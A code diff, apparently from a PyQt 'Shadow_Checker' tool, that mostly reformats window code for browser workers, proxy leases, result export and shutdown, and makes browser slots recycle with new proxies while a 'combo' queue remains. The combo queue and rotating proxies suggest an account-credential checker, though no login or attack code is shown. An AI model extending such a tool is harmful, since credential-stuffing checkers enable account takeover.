-            self._completed_browser_ids = set()
-        self._completed_browser_ids.add(worker.browser_id)
         if worker.lease is not None:
             self.proxy_pool.release(worker.lease)
         if worker in self.workers:
             self.workers.remove(worker)
 
-        # After a lease is released, one previously waiting browser slot may
-        # run. Each slot can run at most once per scan; never an endless loop.
-        if not self.stopping:
-            self.start_browser_sessions()
+        self.update_browser_status(worker.browser_id, "RECYCLING", "Waiting for next proxy")
+        card = self._browser_cards.get(worker.browser_id)
+        if card is not None:
+            card.hide()
+        self.log(f"[Browser #{worker.browser_id}] Session finished; refreshing slot.")
 
-        if not self.workers and self.runtime_scan_done:
+        if not self.stopping and not self.combo_queue.empty():
+            QTimer.singleShot(1500, self.start_browser_sessions)
+
+        if self.combo_queue.empty() and not self.workers:
             self.start_btn.setEnabled(True)
             self.threads.setEnabled(True)
-            self.log("[CHECKER] Firefox sessions finished.")
+            self.log("[CHECKER] All checking tasks completed.")
         self.update_counters()
 
     def export_to_file(self, data):
         try:
             if getattr(sys, "frozen", False):
-                base = Path(
-                    sys.executable
-                ).resolve().parent
+                base = Path(sys.executable).resolve().parent
             else:
-                base = Path(
-                    __file__
-                ).resolve().parent.parent
+                base = Path(__file__).resolve().parent.parent
 
-            directory = (
-                base / "output" / "Shadow_Checker"
-            )
+            directory = base / "output" / "Shadow_Checker"
+            directory.mkdir(parents=True, exist_ok=True)
 
-            directory.mkdir(
-                parents=True,
-                exist_ok=True,
-            )
+            excel = "Excel" in self.mode.currentText()
+            extension = ".xlsx" if excel else ".txt"
 
-            excel = (
-                "Excel"
-                in self.mode.currentText()
-            )
-
-            extension = (
-                ".xlsx" if excel else ".txt"
-            )
-
-            # One stable file per run, not one colliding name per result/second.
             if self._export_path is None or self._export_path.suffix != extension:
                 if not self._export_session_token:
                     self._export_session_token = (
                         datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                         + "_" + uuid.uuid4().hex[:8]
                     )
-                self._export_path = directory / (
-                    f"Results_{self._export_session_token}{extension}"
-                )
+                self._export_path = directory / f"Results_{self._export_session_token}{extension}"
             path = self._export_path
 
-            headers = [
-                "Session",
-                "Website",
-                "Status",
-                "Details",
-            ]
+            headers = ["Session", "Website", "Status", "Details"]
 
-            # Write to a neighbor file before atomic replacement so an
-            # interrupted export never leaves a truncated published result.
             file_handle, temporary_name = tempfile.mkstemp(
                 dir=directory, prefix=".shadow_results_", suffix=extension,
             )
@@ -1357,17 +1200,12 @@ class CheckerWindow(QMainWindow):
             return path
 
         except Exception as exc:
-            self.log(
-                f"[EXPORT ERROR] {exc}"
-            )
+            self.log(f"[EXPORT ERROR] {exc}")
             return None
 
     def stop(self):
         self.stopping = True
-        if (
-            self.runtime_thread
-            and self.runtime_thread.isRunning()
-        ):
+        if self.runtime_thread and self.runtime_thread.isRunning():
             self.runtime_thread.stop()
 
         for worker in self.workers:
@@ -1378,46 +1216,23 @@ class CheckerWindow(QMainWindow):
 
     def restart(self):
         self.stop()
-
-        if (
-            self.runtime_thread
-            and self.runtime_thread.isRunning()
-        ):
-            self.log(
-                "[SYSTEM] Wait for Runtime to stop."
-            )
+        if self.runtime_thread and self.runtime_thread.isRunning():
+            self.log("[SYSTEM] Wait for Runtime to stop.")
             return
-
-        if any(
-            worker.isRunning()
-            for worker in self.workers
-        ):
-            self.log(
-                "[SYSTEM] Wait for Firefox sessions."
-            )
+        if any(worker.isRunning() for worker in self.workers):
+            self.log("[SYSTEM] Wait for Firefox sessions.")
             return
-
         self.clear_results()
-
-        self.log(
-            "[SYSTEM] Ready for a new scan."
-        )
+        self.log("[SYSTEM] Ready for a new scan.")
 
     def clear_results(self):
         self.table.setRowCount(0)
         self.results = []
-
         self.refresh_stats()
-
         self.log("[UI] Results cleared.")
 
     def open_file(self):
-        if (
-            not self.last_export_path
-            or not Path(
-                self.last_export_path
-            ).is_file()
-        ):
+        if not self.last_export_path or not Path(self.last_export_path).is_file():
             QMessageBox.information(
                 self,
                 "Info",
@@ -1438,11 +1253,7 @@ class CheckerWindow(QMainWindow):
 
     def closeEvent(self, event):
         self.stop()
-
-        if (
-            self.runtime_thread
-            and self.runtime_thread.isRunning()
-        ):
+        if self.runtime_thread and self.runtime_thread.isRunning():
             self.runtime_thread.wait(10000)
 
         for worker in list(self.workers):
@@ -1450,18 +1261,12 @@ class CheckerWindow(QMainWindow):
                 worker.wait(5000)
 
         still_running = (
-            self.runtime_thread
-            and self.runtime_thread.isRunning()
-        ) or any(
-            worker.isRunning()
-            for worker in self.workers
-        )
+            self.runtime_thread and self.runtime_thread.isRunning()
+        ) or any(worker.isRunning() for worker in self.workers)
 
         if still_running:
             event.ignore()
-            self.log(
-                "[SYSTEM] Waiting for threads to finish."
-            )
+            self.log("[SYSTEM] Waiting for threads to finish.")
             return
 
         self.diagnostic("system", "normal_exit", events=self._diag_count)
@@ -1471,8 +1276,6 @@ class CheckerWindow(QMainWindow):
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-
     window = CheckerWindow()
     window.show()
-
     sys.exit(app.exec())
